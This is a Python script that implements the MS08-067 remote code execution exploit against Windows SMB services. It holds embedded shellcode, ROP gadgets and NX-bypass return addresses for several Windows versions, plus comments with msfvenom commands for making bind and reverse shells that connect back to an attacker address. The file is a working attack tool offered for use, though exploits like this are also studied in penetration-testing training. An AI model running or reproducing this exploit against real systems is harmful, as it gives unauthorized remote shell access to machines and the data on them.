#!/usr/bin/env python
import struct
import time
import sys
from threading import Thread  # Thread is imported incase you would like to modify

try:
    from impacket import smb
    from impacket import uuid
    #from impacket.dcerpc import dcerpc
    from impacket.dcerpc.v5 import transport

except ImportError, _:
    print 'Install the following library to make this script work'
    print 'Impacket : https://github.com/CoreSecurity/impacket.git'
    print 'PyCrypto : https://pypi.python.org/pypi/pycrypto'
    sys.exit(1)

print '#######################################################################'
print '#   MS08-067 Exploit'
print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'
print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'
print '#'
print '#   Mod in 2018 by Andy Acer'
print '#   - Added support for selecting a target port at the command line.'
print '#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport'
print '#   - Changed shellcode handling to allow for variable length shellcode.'
print '#######################################################################\n'

print ('''
$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .

''')

print '#######################################################################\n'


# ------------------------------------------------------------------------
# REPLACE THIS SHELLCODE with shellcode generated for your use
# Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS.
#
# Example msfvenom commands to generate shellcode:
# msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

#Read about staged vs unstaged shells --- Very Important
# Reverse TCP to 10.10.14.13 port 443:
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.13 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
# ------------------------------------------------------------------------
shellcode =  b""
shellcode += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x32\xc8\x85\xef\x83\xee\xfc"
shellcode += b"\xe2\xf4\xce\x20\x07\xef\x32\xc8\xe5\x66\xd7"
shellcode += b"\xf9\x45\x8b\xb9\x98\xb5\x64\x60\xc4\x0e\xbd"
shellcode += b"\x26\x43\xf7\xc7\x3d\x7f\xcf\xc9\x03\x37\x29"
shellcode += b"\xd3\x53\xb4\x87\xc3\x12\x09\x4a\xe2\x33\x0f"
shellcode += b"\x67\x1d\x60\x9f\x0e\xbd\x22\x43\xcf\xd3\xb9"
shellcode += b"\x84\x94\x97\xd1\x80\x84\x3e\x63\x43\xdc\xcf"
shellcode += b"\x33\x1b\x0e\xa6\x2a\x2b\xbf\xa6\xb9\xfc\x0e"
shellcode += b"\xee\xe4\xf9\x7a\x43\xf3\x07\x88\xee\xf5\xf0"
shellcode += b"\x65\x9a\xc4\xcb\xf8\x17\x09\xb5\xa1\x9a\xd6"
shellcode += b"\x90\x0e\xb7\x16\xc9\x56\x89\xb9\xc4\xce\x64"
shellcode += b"\x6a\xd4\x84\x3c\xb9\xcc\x0e\xee\xe2\x41\xc1"
shellcode += b"\xcb\x16\x93\xde\x8e\x6b\x92\xd4\x10\xd2\x97"
shellcode += b"\xda\xb5\xb9\xda\x6e\x62\x6f\xa0\xb6\xdd\x32"
shellcode += b"\xc8\xed\x98\x41\xfa\xda\xbb\x5a\x84\xf2\xc9"
shellcode += b"\x35\x37\x50\x57\xa2\xc9\x85\xef\x1b\x0c\xd1"
shellcode += b"\xbf\x5a\xe1\x05\x84\x32\x37\x50\xbf\x62\x98"
shellcode += b"\xd5\xaf\x62\x88\xd5\x87\xd8\xc7\x5a\x0f\xcd"
shellcode += b"\x1d\x12\x85\x37\xa0\x8f\xe5\x3c\xc5\xed\xed"
shellcode += b"\x32\xc9\x3e\x66\xd4\xa2\x95\xb9\x65\xa0\x1c"
shellcode += b"\x4a\x46\xa9\x7a\x3a\xb7\x08\xf1\xe3\xcd\x86"
shellcode += b"\x8d\x9a\xde\xa0\x75\x5a\x90\x9e\x7a\x3a\x5a"
shellcode += b"\xab\xe8\x8b\x32\x41\x66\xb8\x65\x9f\xb4\x19"
shellcode += b"\x58\xda\xdc\xb9\xd0\x35\xe3\x28\x76\xec\xb9"
shellcode += b"\xee\x33\x45\xc1\xcb\x22\x0e\x85\xab\x66\x98"
shellcode += b"\xd3\xb9\x64\x8e\xd3\xa1\x64\x9e\xd6\xb9\x5a"
shellcode += b"\xb1\x49\xd0\xb4\x37\x50\x66\xd2\x86\xd3\xa9"
shellcode += b"\xcd\xf8\xed\xe7\xb5\xd5\xe5\x10\xe7\x73\x65"
shellcode += b"\xf2\x18\xc2\xed\x49\xa7\x75\x18\x10\xe7\xf4"
shellcode += b"\x83\x93\x38\x48\x7e\x0f\x47\xcd\x3e\xa8\x21"
shellcode += b"\xba\xea\x85\x32\x9b\x7a\x3a"

# Gotta make No-Ops (NOPS) + shellcode = 410 bytes
num_nops = 410 - len(shellcode)
newshellcode = "\x90" * num_nops
newshellcode += shellcode  # Add NOPS to the front
shellcode = newshellcode   # Switcheroo with the newshellcode temp variable

#print "Shellcode length: %s\n\n" % len(shellcode)

nonxjmper = "\x08\x04\x02\x00%s" + "A" * 4 + "%s" + \
    "A" * 42 + "\x90" * 8 + "\xeb\x62" + "A" * 10
disableNXjumper = "\x08\x04\x02\x00%s%s%s" + "A" * \
    28 + "%s" + "\xeb\x02" + "\x90" * 2 + "\xeb\x62"
ropjumper = "\x00\x08\x01\x00" + "%s" + "\x10\x01\x04\x01";
module_base = 0x6f880000


def generate_rop(rvas):
    gadget1 = "\x90\x5a\x59\xc3"
    gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]
    gadget3 = "\xcc\x90\xeb\x5a"
    ret = struct.pack('<L', 0x00018000)
    ret += struct.pack('<L', rvas['call_HeapCreate'] + module_base)
    ret += struct.pack('<L', 0x01040110)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L',
                       rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget1
    ret += struct.pack('<L', rvas['mov [eax], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget2[0]
    ret += gadget2[1]
    ret += struct.pack('<L', rvas[
                       'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget2[2]
    ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget3
    return ret


class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445):
        super(SRVSVC_Exploit, self).__init__()

        # MODIFIED HERE
        # Changed __port to port ... not sure if that does anything. I'm a newb.
        self.port = port
        self.target = target
        self.os = os

    def __DCEPacket(self):
        if (self.os == '1'):
            print 'Windows XP SP0/SP1 Universal\n'
            ret = "\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '2'):
            print 'Windows 2000 Universal\n'
            ret = "\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '3'):
            print 'Windows 2003 SP0 Universal\n'
            ret = "\x9e\x12\x00\x01"  # 0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '4'):
            print 'Windows 2003 SP1 English\n'
            ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
        elif (self.os == '5'):
            print 'Windows XP SP3 French (NX)\n'
            ret = "\x07\xf8\x5b\x59"  # 0x59 5b f8 07
            disable_nx = "\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '6'):
            print 'Windows XP SP3 English (NX)\n'
            ret = "\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
            disable_nx = "\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '7'):
            print 'Windows XP SP3 English (AlwaysOn NX)\n'
            rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
                'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
            # the nonxjmper also work in this case.
            jumper = generate_rop(rvasets) + "AB"
        else:
            print 'Not supported OS version\n'
            sys.exit(-1)

        print '[-]Initiating connection'

        # MORE MODIFICATIONS HERE #############################################################################################

        if (self.port == '445'):
            self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        else:
            # DCERPCTransportFactory doesn't call SMBTransport with necessary parameters. Calling directly here.
            # *SMBSERVER is used to force the library to query the server for its NetBIOS name and use that to 
            #   establish a NetBIOS Session.  The NetBIOS session shows as NBSS in Wireshark.

            self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename = '\\browser' )
        
        self.__trans.connect()
        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(
            ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        path = "\x5c\x00" + "ABCDEFGHIJ" * 10 + shellcode + "\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + \
            "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + jumper + "\x00" * 2
        server = "\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix = "\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
        
        # NEW HOTNESS
        # The Path Length and the "Actual Count" SMB parameter have to match.  Path length in bytes
        #   is double the ActualCount field.  MaxCount also seems to match.  These fields in the SMB protocol
        #   store hex values in reverse byte order.  So: 36 01 00 00  => 00 00 01 36 => 310.  No idea why it's "doubled"
        #   from 310 to 620.  620 = 410 shellcode + extra stuff in the path.
        MaxCount = "\x36\x01\x00\x00"  # Decimal 310. => Path length of 620.
        Offset = "\x00\x00\x00\x00"
        ActualCount = "\x36\x01\x00\x00" # Decimal 310. => Path length of 620

        self.__stub = server + MaxCount + Offset + ActualCount + \
            path + "\xE8\x03\x00\x00" + prefix + "\x01\x10\x00\x00\x00\x00\x00\x00"        

        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)
        time.sleep(3)
        print 'Exploit finish\n'

if __name__ == '__main__':
       try:
           target = sys.argv[1]
           os = sys.argv[2]
           port = sys.argv[3]
       except IndexError:
                print '\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0]
                print 'Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445'
                print 'Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)'
                print 'Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal'
                print 'Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English'
                print 'Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)'
                print 'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)'
                print 'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)'
                print ''
                print 'FYI: nmap has a good OS discovery script that pairs well with this exploit:'
                print 'nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1'
                print ''
                sys.exit(-1)


current = SRVSVC_Exploit(target, os, port)
current.start()
